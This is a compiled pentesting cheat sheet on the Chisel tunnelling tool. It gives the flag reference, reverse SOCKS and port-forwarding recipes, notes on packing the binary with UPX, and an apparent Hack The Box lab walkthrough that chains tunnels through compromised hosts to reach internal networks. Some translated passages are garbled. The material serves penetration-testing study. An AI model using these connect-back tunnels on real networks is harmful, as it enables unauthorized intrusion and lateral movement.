

##
#
https://notes.justin-p.me/cheatsheets/tools/chisel/
#
https://ap3x.github.io/posts/pivoting-with-chisel/
#
##


![reverse_sock](https://user-images.githubusercontent.com/55672787/206962423-59cb6b3e-a17e-4817-97a4-f4b942d93e89.png)


chisel
Installation
https://github.com/jpillora/chisel/releases
Docker
docker run --rm -it jpillora/chisel --help
go get
go get -v github.com/jpillora/chisel
Usage
Server
chisel server [options]
Client
chisel client [options] <server> <remote> [remote] [remote] ..
Flags
Server
    --host, Defines the HTTP listening host – the network interface
    (defaults the environment variable HOST and falls back to 0.0.0.0).

    --port, -p, Defines the HTTP listening port (defaults to the environment
    variable PORT and fallsback to port 8080).

    --key, An optional string to seed the generation of a ECDSA public
    and private key pair. All communications will be secured using this
    key pair. Share the subsequent fingerprint with clients to enable detection
    of man-in-the-middle attacks (defaults to the CHISEL_KEY environment
    variable, otherwise a new key is generate each run).

    --authfile, An optional path to a users.json file. This file should
    be an object with users defined like:
      {
        "<user:pass>": ["<addr-regex>","<addr-regex>"]
      }
    when <user> connects, their <pass> will be verified and then
    each of the remote addresses will be compared against the list
    of address regular expressions for a match. Addresses will
    always come in the form "<remote-host>:<remote-port>" for normal remotes
    and "R:<local-interface>:<local-port>" for reverse port forwarding
    remotes. This file will be automatically reloaded on change.

    --auth, An optional string representing a single user with full
    access, in the form of <user:pass>. It is equivalent to creating an
    authfile with {"<user:pass>": [""]}. If unset, it will use the
    environment variable AUTH.

    --keepalive, An optional keepalive interval. Since the underlying
    transport is HTTP, in many instances we'll be traversing through
    proxies, often these proxies will close idle connections. You must
    specify a time with a unit, for example '5s' or '2m'. Defaults
    to '25s' (set to 0s to disable).

    --backend, Specifies another HTTP server to proxy requests to when
    chisel receives a normal HTTP request. Useful for hiding chisel in
    plain sight.

    --socks5, Allow clients to access the internal SOCKS5 proxy. See
    chisel client --help for more information.

    --reverse, Allow clients to specify reverse port forwarding remotes
    in addition to normal remotes.

    --tls-key, Enables TLS and provides optional path to a PEM-encoded
    TLS private key. When this flag is set, you must also set --tls-cert,
    and you cannot set --tls-domain.

    --tls-cert, Enables TLS and provides optional path to a PEM-encoded
    TLS certificate. When this flag is set, you must also set --tls-key,
    and you cannot set --tls-domain.

    --tls-domain, Enables TLS and automatically acquires a TLS key and
    certificate using LetsEncypt. Setting --tls-domain requires port 443.
    You may specify multiple --tls-domain flags to serve multiple domains.
    The resulting files are cached in the "$HOME/.cache/chisel" directory.
    You can modify this path by setting the CHISEL_LE_CACHE variable,
    or disable caching by setting this variable to "-". You can optionally
    provide a certificate notification email by setting CHISEL_LE_EMAIL.

    --tls-ca, a path to a PEM encoded CA certificate bundle or a directory
    holding multiple PEM encode CA certificate bundle files, which is used to 
    validate client connections. The provided CA certificates will be used 
    instead of the system roots. This is commonly used to implement mutual-TLS. 

    --pid Generate pid file in current working directory

    -v, Enable verbose logging

    --help, This help text
Client
    --fingerprint, A *strongly recommended* fingerprint string
    to perform host-key validation against the server's public key.
        Fingerprint mismatches will close the connection.
        Fingerprints are generated by hashing the ECDSA public key using
        SHA256 and encoding the result in base64.
        Fingerprints must be 44 characters containing a trailing equals (=).

    --auth, An optional username and password (client authentication)
    in the form: "<user>:<pass>". These credentials are compared to
    the credentials inside the server's --authfile. defaults to the
    AUTH environment variable.

    --keepalive, An optional keepalive interval. Since the underlying
    transport is HTTP, in many instances we'll be traversing through
    proxies, often these proxies will close idle connections. You must
    specify a time with a unit, for example '5s' or '2m'. Defaults
    to '25s' (set to 0s to disable).

    --max-retry-count, Maximum number of times to retry before exiting.
    Defaults to unlimited.

    --max-retry-interval, Maximum wait time before retrying after a
    disconnection. Defaults to 5 minutes.

    --proxy, An optional HTTP CONNECT or SOCKS5 proxy which will be
    used to reach the chisel server. Authentication can be specified
    inside the URL.
    For example, http://admin:password@my-server.com:8081
            or: socks://admin:password@my-server.com:1080

    --header, Set a custom header in the form "HeaderName: HeaderContent".
    Can be used multiple times. (e.g --header "Foo: Bar" --header "Hello: World")

    --hostname, Optionally set the 'Host' header (defaults to the host
    found in the server url).

    --tls-ca, An optional root certificate bundle used to verify the
    chisel server. Only valid when connecting to the server with
    "https" or "wss". By default, the operating system CAs will be used.

    --tls-skip-verify, Skip server TLS certificate verification of
    chain and host name (if TLS is used for transport connections to
    server). If set, client accepts any TLS certificate presented by
    the server and any host name in that certificate. This only affects
    transport https (wss) connection. Chisel server's public key
    may be still verified (see --fingerprint) after inner connection
    is established.

    --tls-key, a path to a PEM encoded private key used for client 
    authentication (mutual-TLS).

    --tls-cert, a path to a PEM encoded certificate matching the provided 
    private key. The certificate must have client authentication 
    enabled (mutual-TLS).

    --pid Generate pid file in current working directory

    -v, Enable verbose logging

    --help, This help text
Examples
Basic Reverse
Listen on port 8000

./chisel server --reverse
Forward local port 8080 to the server on port 8001

./chisel client <server_ip:server_port> R:8001:127.0.0.1:8080
On the chisel server you can now access the service hosted on port 8080 on port 8000 over the tunnel.

Reverse Socks
Reverse Socks

Start a server on the server node

chisel server -p 8000 -reverse
Connect the client to the server node and expose a unused local port that will be used for the socks5 proxy.

chisel client <server_ip:server_port> R:8001:127.0.0.1:9000
Start a server instance on the client that suports socks5

chisel server -p 9000 --socks5
Start a client on the server node.

chisel client 127.0.0.1:8001 socks
Use proxychains to connect to a endpoint through chisel

proxychains crackmapexec smb 192.168.56.10
    
#
##
##
##
#
    
https://hideandsec.sh/books/cheatsheets-82c/page/pivoting


Chisel
Local port forwarding

```
#Pivot machine

chisel server -p 8080 --host 192.168.2.105 -v

#Our machine

chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80

Local port forwarding + SOCKS proxy

#Pivot machine

chisel server -p 8080 --host 192.168.2.105 --socks5 -v

#Our machine

chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks

#Use

curl –head http://10.42.42.2 –proxy socks5://127.0.0.1:33333

Reverse remote port forwarding

#Our machine

chisel server -p 8888 --host 192.168.2.149 --reverse -v

#Pivot machine

chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80

Reverse remote port forwarding + proxy SOCKS (auto local port forwarding internal socks proxy)

On our machine :

chisel server -p 8888 --host 192.168.2.149 --reverse -v

Chisel can't be used as a SOCKS proxy server directly :

    Run a SOCKS server
    Connect us with a second client
    Make a local port forwarding to the local Chisel server in order to share the SOCKS proxy server to the first client

On the pivot machine :

chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:127.0.0.1:55555

chisel server -p 62000 --host 127.0.0.1 --socks5 -v

chisel client -v http://127.0.0.1:62000 127.0.0.1:55555:socks

To test : curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:44444
```

Pivot with Chisel
Pivoting With Chisel
Use Chisel to traverse the intranet

Posted on July 1st, 2019
ForewordRecently, when I encountered a target in the project on the intranet, I used Chisel to open a tunnel to the intranet. If I want to do something good, I must first sharpen my tools, so I decided to share this tool with everyone.

What is Chisel

Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang).

    Https://github.com/jpillora/chisel

The above is the explanation in chisel official GitHub repo

In one sentence, it is: Chisel is a fast TCP tunneling tool for writing open source communication encryption for bypassing firewalls using HTTP? protocol for transmission.

Features:

    Easy to use
    high performance
    Encrypted connection using SSH protocol (via crypto/ssh)
    Support for authentication
    Client automatically reconnects
    Clients can create multiple tunnels over a single TCP connection
    Clients can create an HTTP CONNECT proxy
    Server can choose to double as a reverse proxy
    The server can choose to create a SOCKS5 proxy
    Support reverse port forwarding

Why choose Chisel

Lcx is a well-known port forwarding tool in China. It is very stable but has a shortcoming. For example, using lcx to forward the RDP port of the intranet Windows, the RDP connection cannot be used after it is disconnected once, and the port must be re-executed. Forward

EarthWorm&Termite is really powerful, the file size is only a few tens of KB, but this tool is closed source, and it doesn’t feel good for free but closed source programs, because the tool has been killed and killed.

The author also stopped developing

Also found a tool called frp, a lot of features, but the operation requires a configuration file, not suitable for penetration of network penetration in the test.

There are many similar tools, you can choose according to your own needs.

Choosing to find Chisel is still quite good.
Install Chisel

Chisel is written in Go, so it supports almost all operating systems. It can download executable files for each operating system directly from GitHub, but it is relatively large. The executable file under the downloaded MacOS system is 8M in size, so I Choose to compile from source, customize the configuration to a smaller size

First, prepare the Go runtime environment. For the installation method of each operating system, see the official website:https://golang.org/doc/install

The following operations are performed under the MacOS system.

Need to be set before downloading GOPATH

Download chisel from github

go get -v github.com/jpillora/chisel

Compile

go build github.com/jpillora/chisel

Will generate an executable called Chisel in the current directory, let’s look at the size

▶ go build github.com/jpillora/chisel

▶ du -sh chisel
 11M	chisel

11 M, too large, you can reduce the file content by removing the symbol table (-s)and relocating information at compile time (-w).

▶ go build -ldflags "-s -w" github.com/jpillora/chisel

~/MyTools/Pivot
▶ du -sh chisel
8.8M	chisel

It’s 8M now, it’s still a bit big, try adding a UPX shell.

▶ upx -9 chisel
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   9258820 ->   3399696   36.72%   macho/amd64   chisel

Packed 1 file.

▶ du -sh chisel
4.0M	chisel

Now it’s 4M, it’s still a bit bigger than other tools, but it’s good to compress from 11M to 4M. The executable file compiled by go is very large because go compiles by default using static compilation, does not depend on any dynamic links. Library, so you can deploy to any running environment, don’t worry about dependency

Compile the Windows version on MacOS using the following command

▶ env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w" github.com/jpillora/chisel

▶ file chisel-x64.exe
chisel-x64.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows

Compress with UPX

▶ du -sh chisel-x64.exe
8.0M	chisel-x64.exe

▶ upx chisel-x64.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   8342528 ->   3173376   38.04%    win64/pe     chisel-x64.exe

Packed 1 file.

▶ du -sh chisel-x64.exe
3.0M	chisel-x64.exe

If desired the compiled executable file in the other operating system, go buildprovided compile time GOOSand GOARCHis a value corresponding to the specific value Seeing GitHub Gist
Use Chisel to bounce Socks5 proxy

Chisel can use the Chisel to bounce a socks5 agent from the target network when it encounters a target in the penetration test or is blocked by the firewall.

The principle of Chisel’s rebound Socks5 agent is roughly as follows

The specific steps are as follows:

Executed in a host with a public IP address

chisel server -p 1111 --reverse  

The above command will listen to the local (0.0.0.0) port 1111 and allow the far end to specify the forwarding port.

chisel client 0.0.0.0:2222 socks 

The above command will start the socks5 service on the local 1080 port of 127.0.0.1 and forward the request to the local port 2222.

Executed in the host of the target network that needs to be accessed or in the host in the LAN environment

chisel client WANIP:1111 R:2222:127.0.0.1:3333 

The above command opens a tunnel on port 1111 of WANIP and maps the 2222 port of WANIP to the local 3333 port in this tunnel.

chisel server -p 3333 --socks5 

The above command starts the Socks5 service on the local 3333 port.

At this time, the Socks5 proxy of the public network host 1080 port leads to the other network through the tunnel of the 1111 port.

Conditional students can go to see Ippsec video demo
Port mapping using Chisel

Chisel can implement the same functions as lcx, as follows:

Start the Chisel server on the public network host:

chisel server -p 1337 --reverse

Start the Chisel client on the intranet host:

chisel client WANIP:1337 R:1234:LANIP:3389  

WANIP is the public network IP of the public network host, and LANIP is the internal network IP of the internal network host.

If the client mode of Chisel is started on server1 and the LANIP is the IP of server1, the port 3389 of server1 is mapped to port 1234 of the public network host.

If the client mode of Chisel is running on server1, but the LANIP is the IP of server2, the 3389 port of server2 is mapped to the port 1234 of the public network through server1.

From the second usage, Chisel’s port forwarding function is more powerful than lcx.

After mastering the above port forwarding skills, Ma Ma no longer has to![68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230](https://user-images.githubusercontent.com/55672787/165667055-f9811955-5791-4082-9aa6-8a370a60c261.png)
![2019-04-12-074113](https://user-images.githubusercontent.com/55672787/165667058-e4b09fcb-4e89-44f2-9e19-ceb30092d8f5.jpg)
![2019-04-17-143105](https://user-images.githubusercontent.com/55672787/165667059-52987548-4eca-496a-aa31-aafc7b006368.jpg)



Pivoting with Chisel
Posted Nov 18, 2020  Updated Feb 21, 2023
By Ap3x
4 min read
Summary
Recently I’ve completed the Hack The Box Dante Pro Labs and really enjoyed it. One of the most crucial pieces to being successful in the lab is understanding how to pivot properly. So I wanted to write up a blog post explaining how to properly pivot.

Network
Below is a simulated network that I have drawn up to help understand things a bit more visually as I set though setting up or proxy tunnels.


Lets assume that we have enumerated the network and identified a computer on the Admin network and we need to gain access and exfil data from it. Our attacker machine is 10.10.101.51 and the web server we need to breach is external facing and has an external IP of 10.10.101.50 and an internal IP or 172.16.1.101. Lets assume that you have a foothold or even root/admin on the web server and you want begin to do recon of the internal network. There are a ton of ways to go about doing this such as:

Transfering a tool such as nmap directly on the machine we have access to and scan the internal network.
A dynamic ssh tunnel utilizing socks4/socks5 and use proxychains and nmap (may be a bit slow)
Use Cobalt Strike to setup a proxy to pivot through.
The main focus of this post is to understand how to properly pivot without those other methods and use chisel instead.

First we need to start a chisel server running on port 8001 our attacker machine so we can pivot through the 10.10.101.50 machine and gain access to the network. Run the command below to start a server:

#Run command on attacker machine (10.10.101.51)
./chisel server -p 8001 --reverse
Assuming we have a foothold on the Web Server we can transfer chisel to the machine and connect back to our chisel server to complete the tunnel.

#Run command on Web Server machine (172.16.1.101 || 10.10.101.50)
./chisel client 10.10.101.51:8001 R:1080:socks
This will create a reverse proxy and open port 1080 on our machine. Now we can modify our proxychains.conf file to use this proxy. At the bottom of the /etc/proxychains.conf add socks5 127.0.0.1 1080. Now that we have this working we can use this to conduct a simple nmap of the internal network from the Web Server.

#Run command on attacker machine (10.10.101.50 || 172.16.1.101)
proxychains4 nmap 172.16.1.1/24
Now that we have gathered all the info about our current subnet and gained access to all the computers including the domain controller we now want to pivot into the second subnet. We are assuming that the domain controller on the Office Network has a trust with the Admin Network. First we need to start a chisel server on the Web Server in addition to the chisel client we are already using to pivot onto the Office Network similar to how we started a chisel server on our attacker machine. Next we need to transfer the chisel client to the Windows domain controller (172.16.1.5) to connect to our chisel server on the web server system so can chain our tunnel.

#Run command on Web Server machine (172.16.1.101)
./chisel server -p 8002 --reverse
Then on the domain controller (172.16.1.5) in the office network we want create a new connection that will connect to the chisel server running on 172.16.1.101 on port 8002

#Run command on Office Domain Controller machine (172.16.1.5)
chisel.exe client 172.16.1.101:8002 R:2080:socks
Finally we now want to add this new connection in our proxychains.conf which will look like something below.

socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
Our connection should now now be 

Now that we can tunnel through the domain controller we can do some more recon and find the IP of the domain controller of the Admin network. Once we identify the IP of the DC in Admin network (172.16.2.10) we can begin to look for a path of compromise.

Lets assume that we now have access to the domain controller in the Admin network. We now want to pivot again from the Office network DC to the Admin network DC so we can recon and eventually gain access to our target computer on the Admin network (172.16.2.200). First we want to create a server on the Office DC

#Run command on Office Domain Controller machine (172.16.1.5 )
chisel.exe server -p 8003 --reverse
Then on the Admin DC we want to run the following command to connect back to our domain controller.

#Run command on Admin Domain Controller machine (172.16.2.5)
chisel.exe client 172.16.1.5:8003 R:3080:socks
Finally we want to add a third entry into our proxychains.conf

socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
socks5 127.0.0.1 3080 
We have now successfully pivoted three times to get to our target goal which is to have access to the target computer on the admin network. The proxy connections should look something like below. Since we own the domain controller we can now use this to gain access to login to the machine at 172.16.2.200


 Pentesting, Pivoting
 pivot red team network chisel
This post is licensed under CC BY 4.0 by the author.
Recently Updated
Unmasking Secrets: Deciphering Encrypted Passwords through Reverse Engineering
Refined Home Lab Network
HTB Dante Pro Lab and THM Throwback AD Lab
Exploit Exercise Protostar Stack Series
Hardware Hacking CTF - HackIN
 worry that I can’t access my fragrant broiler because of the firewall or internal and external network restrictions!
Reference link


